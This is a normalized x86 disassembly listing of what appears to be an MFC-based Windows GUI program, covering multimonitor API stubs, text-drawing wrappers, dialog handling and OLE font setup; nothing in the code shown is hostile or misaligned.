mov eax sub_425e2f
call sub_40cc20
sub esp 0xc
push ebx
and [ ebp - 0x18 ] 0x0
push esi
mov esi ecx
lea ecx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
push eax
call sub_41c0cd
mov eax [ ebp - 0x10 ]
push 0x1
pop ebx
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x4 ] ebx
cmp [ ecx + eax - 0x1 ] 0x5c
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx esi
call [ eax + 0xc ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x2
call sub_41c5b7
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call sub_41c358
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41c0cd
mov [ ebp - 0x18 ] ebx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_41c358
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ecx + eax - 0x1 ] 0x2f
je r-xdata
mov al [ esi + 0x18 ]
lea ecx [ ebp - 0x10 ]
push eax
call sub_41c5a2
sub_40494e
mov eax sub_425e63
call sub_40cc20
sub esp 0xc
mov eax [ ecx ]
and [ ebp - 0x18 ] 0x0
push ebx
lea edx [ ebp - 0x14 ]
push esi
push edx
call [ eax + 0xc ]
mov eax [ rw-data ]
push 0x1
pop ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x14 ]
push 0x0
push 0x104
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x2
call sub_41c5cf
push eax
push 0x0
push 0x0
push esi
call sub_40d27c
add esp 0x14
lea ecx [ ebp - 0x10 ]
push 0xffffffff
call sub_41c61e
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41c0cd
mov [ ebp - 0x18 ] ebx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] bl
call sub_41c358
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x14 ]
call sub_41c358
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_4049df
mov eax sub_425e8f
call sub_40cc20
push ecx
push ecx
mov eax [ rw-data ]
and [ ebp - 0x14 ] 0x0
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ecx + 0x4 ]
push 0x1
pop esi
test eax eax
mov [ ebp - 0x4 ] esi
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41c0cd
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_41c358
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
add eax 0x2c
lea ecx [ ebp - 0x10 ]
push eax
call sub_41c49d
sub_404a3e
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
cmp [ rw-data ] ebx
setne al
jmp r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] 0x1
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push 0x1
pop eax
mov [ rw-data ] eax
jmp r-xdata
sub_404b16
push esi
push edi
call sub_404a3e
test eax eax
je r-xdata
test [ esp + 0x10 ] 0x3
jne r-xdata
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call [ rw-data ]
jmp r-xdata
mov eax 0x12340042
mov esi [ esp + 0xc ]
xor eax eax
cmp [ esi + 0x8 ] eax
jle r-xdata
pop edi
pop esi
retn 0x8
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] eax
jle r-xdata
mov edi [ GetSystemMetrics@IAT ]
push eax
call edi
cmp [ esi ] eax
jge r-xdata
push 0x1
call edi
cmp [ esi + 0x4 ] eax
jl r-xdata
sub_404b6c
push ebp
mov ebp esp
sub esp 0x2c
call sub_404a3e
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
push [ ebp + 0x8 ]
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
leave
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowPlacement@IAT ]
jmp r-xdata
xor eax eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_404b16
jmp r-xdata
test eax eax
je r-xdata
sub_404bd7
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
call sub_404a3e
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x12340042
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
xor esi esi
cmp ebx esi
je r-xdata
pop esi
pop ebx
leave
retn 0x8
cmp [ ebx ] 0x28
jb r-xdata
lea eax [ ebp - 0x10 ]
push esi
push eax
push esi
push 0x30
call [ SystemParametersInfoA@IAT ]
test eax eax
je r-xdata
push edi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
push esi
mov esi [ GetSystemMetrics@IAT ]
call esi
push 0x1
mov [ ebx + 0xc ] eax
call esi
lea edi [ ebx + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebx ] 0x48
push 0x1
movsd [ edi ] [ esi ]
pop esi
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x24 ] esi
pop edi
jb r-xdata
mov eax esi
jmp r-xdata
add ebx 0x28
push r--data
push ebx
call [ lstrcpyA@IAT ]
sub_404df2
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ExtTextOutA@IAT ]
pop ebp
retn 0x1c
sub_404e17
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ecx + 0x4 ]
call [ TabbedTextOutA@IAT ]
mov ecx [ ebp + 0x8 ]
movsx edx ax
shr eax 0x10
movsx eax ax
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebp
retn 0x20
sub_404e6b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x4 ]
call [ GrayStringA@IAT ]
pop ebp
retn 0x20
mov eax [ eax + 0x4 ]
sub_404f6d
mov eax sub_42615e
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
call sub_41f974
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x20 ]
call sub_41a9a4
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x4 ]
call sub_41a9a4
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_404fb5
mov eax sub_426168
call sub_40cc20
sub esp 0x34
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
or [ ebp - 0x1c ] 0xffffffff
mov [ ebp - 0x10 ] esp
push edi
push [ ebp + 0x8 ]
mov ebx ecx
push ebx
call sub_4051c7
mov esi eax
xor edx edx
cmp esi edx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
xor ecx ecx
cmp [ esi + 0x24 ] 0xffffffff
mov [ ebp + 0x10 ] edx
mov [ ebp - 0x4 ] edx
setne cl
sub eax edx
mov [ ebp - 0x18 ] ecx
je r-xdata
mov [ eax ] ebx
mov edi [ edi ]
cmp edi edx
jl r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
lea eax [ ebp - 0x40 ]
push eax
call sub_40b948
and [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec eax
je r-xdata
xor ecx ecx
cmp [ eax + 0x4 ] edx
setne cl
mov eax ecx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov eax [ edi + 0x8 ]
push 0x10
lea eax [ ebp - 0x30 ]
push [ edi + 0x8 ]
push eax
call sub_40ce30
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
shl eax 0x4
push eax
call sub_41b806
mov ecx [ ebp - 0x28 ]
add esp 0x10
add ecx 0xfffffff
mov [ ebp - 0x30 ] eax
shl ecx 0x4
push ecx
mov ecx [ edi + 0x8 ]
push [ ecx ]
push eax
call sub_40ce30
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x30 ]
add esp 0xc
shl eax 0x4
lea eax [ eax + ecx - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x3
mov [ eax + 0x8 ] ecx
lea eax [ ebp - 0x30 ]
jmp r-xdata
mov esi [ esi + 0x10 ]
lea eax [ ebp - 0x14 ]
cmp ecx edx
mov [ ebp - 0x14 ] 0x1
push eax
je r-xdata
dec eax
je r-xdata
mov ecx [ esi + 0x10 ]
cmp edi 0x2
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
push [ ebp - 0x30 ]
call sub_41b82f
pop ecx
jmp r-xdata
lea ecx [ ebp - 0x1c ]
push ecx
push eax
lea eax [ ebp - 0x40 ]
mov ecx ebx
push eax
push 0x1
push esi
call sub_424e6d
cmp [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] eax
movsx eax [ ebp - 0x38 ]
mov [ ebp + 0x10 ] eax
je r-xdata
mov ecx ebx
call esi
push [ ebp + 0x8 ]
mov ecx ebx
call esi
jmp r-xdata
mov esi [ esi + 0x14 ]
cmp ecx edx
je r-xdata
dec eax
jne r-xdata
mov ecx [ esi + 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ edi + 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov [ ebp + 0x10 ] eax
xor eax eax
cmp [ ebp - 0x14 ] eax
mov ecx ebx
call esi
push [ ebp + 0x8 ]
mov ecx ebx
call esi
jmp r-xdata
mov esi [ esi + 0x10 ]
lea eax [ ebp - 0x14 ]
push eax
cmp ecx edx
push [ edi + 0x20 ]
mov [ ebp - 0x14 ] 0x1
push [ edi + 0x1c ]
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c ]
cmp ecx 0xffffffff
je r-xdata
and [ ebp - 0x14 ] 0x0
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx ebx
call esi
push [ ebp + 0x8 ]
mov ecx ebx
call esi
jmp r-xdata
mov [ eax ] ecx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov [ ebp + 0x10 ] eax
xor eax eax
cmp [ ebp - 0x14 ] eax
jmp r-xdata
sub_4051c7
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push edi
mov eax [ ecx ]
call [ eax + 0x3c ]
mov ecx [ ebp + 0x10 ]
mov edx eax
xor eax eax
cmp [ ecx ] eax
setne al
test edx edx
mov [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov edi [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x18 ] 0xffffffff
je r-xdata
add eax 0x28
cmp [ eax + 0x18 ] 0xffffffff
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ eax + 0x18 ] ecx
jne r-xdata
cmp [ eax + 0x4 ] edi
jne r-xdata
mov ecx [ eax + 0x24 ]
cmp ecx 0xffffffff
jne r-xdata
cmp [ eax + 0x20 ] ebx
ja r-xdata
mov ecx [ eax + 0x20 ]
cmp ecx 0xffffffff
je r-xdata
cmp ebx ecx
jbe r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
cmp ecx ebx
je r-xdata
jmp r-xdata
sub_40523c
mov eax sub_426174
call sub_40cc20
sub esp 0xc
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] edi
cmp [ edi + 0x34 ] 0x0
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ edi + 0x34 ] 0x0
je r-xdata
call sub_422d64
mov ecx [ eax + 0x1038 ]
push edi
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ edi + 0x34 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
xor eax eax
cmp [ edi + 0x34 ] eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
setne al
pop ebx
leave
retn
test edi edi
mov esi edi
je r-xdata
mov ebx 0x100
push [ esi + 0x1c ]
or [ esi + 0x24 ] ebx
call [ GetParent@IAT ]
push eax
call sub_41cbcb
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
mov eax [ esi + 0x1c ]
test esi esi
jne r-xdata
test [ esi + 0x24 ] ebx
jne r-xdata
sub_4052f1
mov eax sub_426188
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_41b33b
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push 0xa
lea ecx [ esi + 0x20 ]
mov [ esi + 0x1c ] eax
call sub_41a8f1
or [ esi + 0x3c ] 0xffffffff
or [ esi + 0x40 ] 0xffffffff
and [ esi + 0x44 ] 0x0
and [ esi + 0x48 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ esi + 0x4c ] r--data
mov [ esi + 0x50 ] r--data
mov [ esi ] r--data
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40536c
mov eax sub_4261a7
call sub_40cc20
sub esp 0x10
push esi
mov esi ecx
push edi
mov [ ebp - 0x1c ] esi
mov [ esi ] r--data
mov eax [ esi + 0x2c ]
mov [ ebp - 0x4 ] 0x1
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ esi + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
lea edi [ esi + 0x20 ]
lea edi [ esi + 0x20 ]
mov ecx edi
call sub_41a979
lea eax [ esi + 0x44 ]
push eax
call sub_42408f
and [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_41a9a4
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41b355
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
lea edi [ esi + 0x20 ]
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x18 ]
mov ecx edi
call sub_41aae8
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x14 ]
mov ecx edi
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41ab2a
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x88 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x14 ]
mov ecx edi
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41ab2a
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
sub_40544a
push ebp
mov ebp esp
sub esp 0x20
push esi
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov esi ecx
push eax
call [ CopyRect@IAT ]
push [ ebp + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
push [ ebp + 0x28 ]
sub eax ecx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
push [ ebp + 0x20 ]
sub ecx edx
mov [ ebp - 0x4 ] ecx
mov ecx esi
push [ ebp + 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4054ab
pop esi
leave
retn 0x28
sub_4054ab
mov eax sub_4261b4
call sub_40cc20
sub esp 0x10
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esp
call sub_422d64
mov ecx [ eax + 0x1038 ]
push [ ebp - 0x14 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov esi eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test esi esi
jne r-xdata
push [ ebp + 0x2c ]
mov ecx esi
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406247
xor ecx ecx
test eax eax
setge cl
mov edi ecx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
push [ esi + 0x20 ]
lea ecx [ eax + 0x20 ]
call sub_41aa98
mov [ eax ] esi
mov eax [ ebp + 0x30 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x2c
mov eax edi
mov [ eax ] esi
jmp r-xdata
sub_405566
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0x2c ]
push esi
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
xor eax eax
lea esi [ ecx + 0x20 ]
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
pop esi
leave
retn 0x4
lea eax [ ebp - 0x8 ]
mov ecx esi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_41ab2a
mov ecx [ ebp - 0x8 ]
call sub_406a4b
cmp eax [ ebp + 0x8 ]
je r-xdata
sub_4055b0
mov eax sub_4261d0
call sub_40cc20
sub esp 0x14
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
lea eax [ edi + 0x2cc ]
cmp eax 0xf
ja r-xdata
xor eax eax
jmp [ eax * 4 + jump_table_405778 ]
mov eax [ ebp + 0x10 ]
or [ eax + 0x8 ] 0xffff
mov [ eax ] 0xb
jmp r-xdata
mov eax [ ebp + 0x10 ]
and [ eax + 0x8 ] 0x0
mov [ eax ] 0xb
jmp r-xdata
mov esi [ ebp + 0x10 ]
xor edi edi
mov [ esi ] 0x2
cmp [ rw-data ] edi
jne r-xdata
cmp [ esi + 0x3c ] 0xffffffff
jne r-xdata
xor edi edi
cmp [ esi + 0x44 ] edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ esi ] 0xb
call sub_406a7b
neg eax
sbb eax eax
mov [ esi + 0x8 ] ax
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov [ esi ] 0x3
call [ GetThreadLocale@IAT ]
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
mov esi [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x8 ]
mov [ esi ] 0x8
call sub_424b62
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x8 ] eax
lea ecx [ ebp + 0x8 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp + 0xc ] eax
push 0xf1c0
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x1
call sub_41f410
mov esi [ ebp + 0x10 ]
lea ecx [ ebp + 0xc ]
mov [ esi ] 0x8
call sub_424b62
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x8 ] eax
lea ecx [ ebp + 0xc ]
push 0x1
pop eax
jmp r-xdata
mov [ esi + 0x8 ] 0x1
jmp r-xdata
call sub_423ac8
cmp [ eax + 0x20 ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp edi 0xfffffd43
mov [ eax ] 0x3
jne r-xdata
push [ esi + 0x1c ]
lea ecx [ ebp - 0x20 ]
call sub_421074
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x1c ]
push eax
push [ ebp - 0x1c ]
push 0x138
push eax
call [ SendMessageA@IAT ]
push [ ebp - 0x18 ]
call [ GetBkColor@IAT ]
push [ ebp - 0x18 ]
mov [ esi + 0x3c ] eax
call [ GetTextColor@IAT ]
lea ecx [ ebp - 0x20 ]
mov [ esi + 0x40 ] eax
call sub_4210e6
mov edi [ ebp + 0x10 ]
mov [ edi ] 0x9
mov eax [ esi + 0x44 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ esi + 0x44 ]
mov [ edi + 0x8 ] eax
jmp r-xdata
mov ecx [ esi + 0x1c ]
call sub_405f34
push eax
mov ecx esi
call sub_4057b8
cmp [ esi + 0x44 ] edi
je r-xdata
call sub_41c358
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov [ esi + 0x8 ] di
jmp r-xdata
mov esi [ esi + 0x40 ]
mov esi [ esi + 0x3c ]
jmp r-xdata
mov [ eax + 0x8 ] esi
jmp r-xdata
sub_4057b8
mov eax sub_4261fc
call sub_40cc20
sub esp 0x7c
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] r--data
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov edi [ GetStockObject@IAT ]
push 0x11
call edi
cmp eax ebx
mov [ ebp - 0x14 ] eax
jne r-xdata
cmp [ eax + 0x4 ] ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
push 0xd
call edi
cmp eax ebx
mov [ ebp - 0x14 ] eax
jne r-xdata
lea ecx [ ebp - 0x88 ]
push ecx
push 0x3c
push [ eax + 0x4 ]
call [ GetObjectA@IAT ]
lea eax [ ebp - 0x6c ]
mov [ ebp - 0x4c ] 0x20
test eax eax
jne r-xdata
lea eax [ ebp - 0x6c ]
push eax
call [ lstrlenA@IAT ]
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_40c4f0
mov edi esp
push esi
push edi
lea eax [ ebp - 0x6c ]
push 0xffffffff
push eax
push ebx
push ebx
mov [ edi ] bx
call [ MultiByteToWideChar@IAT ]
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x48 ] ebx
jmp r-xdata
mov [ esi + 0x44 ] ebx
mov [ ebp - 0x18 ] r--data
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
push [ esi + 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_421074
push 0x5a
mov [ ebp - 0x4 ] 0x2
push [ ebp - 0x24 ]
call [ GetDeviceCaps@IAT ]
mov ecx eax
mov eax edi
imul eax eax 0xafc80
cdq
idiv ecx
add esi 0x44
mov [ ebp - 0x40 ] ebx
push esi
mov [ ebp - 0x44 ] eax
call sub_42408f
push esi
lea eax [ ebp - 0x4c ]
push r--data
push eax
call [ Ordinal_OLEPRO32_253@IAT ]
test eax eax
jge r-xdata
neg eax
mov edi eax
mov ax [ ebp - 0x78 ]
mov [ ebp - 0x3c ] ax
movzx ax [ ebp - 0x71 ]
mov [ ebp - 0x3a ] ax
movzx eax [ ebp - 0x74 ]
mov [ ebp - 0x38 ] eax
movzx eax [ ebp - 0x73 ]
mov [ ebp - 0x34 ] eax
movzx eax [ ebp - 0x72 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x88 ]
cmp eax ebx
mov edi eax
jge r-xdata
lea ecx [ ebp - 0x18 ]
call sub_421292
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x94 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_4210e6
mov [ ebp - 0x18 ] r--data
mov [ ebp - 0x4 ] 0x3
mov [ esi ] ebx
sub_405976
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
leave
retn 0x4
push esi
lea esi [ ecx + 0x20 ]
lea eax [ ebp - 0x8 ]
mov ecx esi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_41ab2a
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
call sub_406e6d
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
pop esi
sub_4059b7
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
leave
retn 0x8
push esi
lea esi [ ecx + 0x20 ]
lea eax [ ebp - 0x4 ]
mov ecx esi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_41ab2a
push [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x2c
push [ ebp + 0x8 ]
push eax
call [ OffsetRect@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x50 ]
add ecx 0x2c
push ecx
push ecx
mov edx [ eax ]
push eax
call [ edx + 0x1c ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop esi
sub_405a11
push esi
mov esi ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
mov [ esi + 0x48 ] eax
pop esi
retn 0x4
mov eax [ eax + 0x50 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_405a3f
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ eax + 0x38 ]
test ecx ecx
jne r-xdata
push [ esp + 0x8 ]
mov eax [ ecx ]
push 0x3
push 0x0
push ecx
call [ eax + 0x6c ]
add esp 0x10
push ecx
push [ esp + 0xc ]
push 0xf1
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
jmp r-xdata
sub_405a7c
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi ecx
pop edi
pop esi
retn 0xc
mov eax [ edi ]
xor ecx ecx
cmp esi [ esp + 0x14 ]
sete cl
push ecx
push esi
mov ecx edi
call [ eax + 0x64 ]
inc esi
jmp r-xdata
cmp esi [ esp + 0x10 ]
jg r-xdata
sub_405abf
push esi
mov esi ecx
push edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push [ esp + 0xc ]
push eax
call [ GetDlgItem@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ eax + 0x1c ]
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
retn 0x8
mov eax [ esi ]
push [ esp + 0xc ]
mov ecx esi
call [ eax + 0x50 ]
test eax eax
je r-xdata
mov edi [ eax + 0x20 ]
sub_405afb
push ebp
mov ebp esp
sub esp 0x100
mov eax [ ecx ]
lea edx [ ebp - 0x100 ]
push 0x100
push edx
push [ ebp + 0x8 ]
call [ eax + 0x78 ]
test eax eax
jne r-xdata
movsx eax [ ebp - 0x100 ]
push esi
push edi
push eax
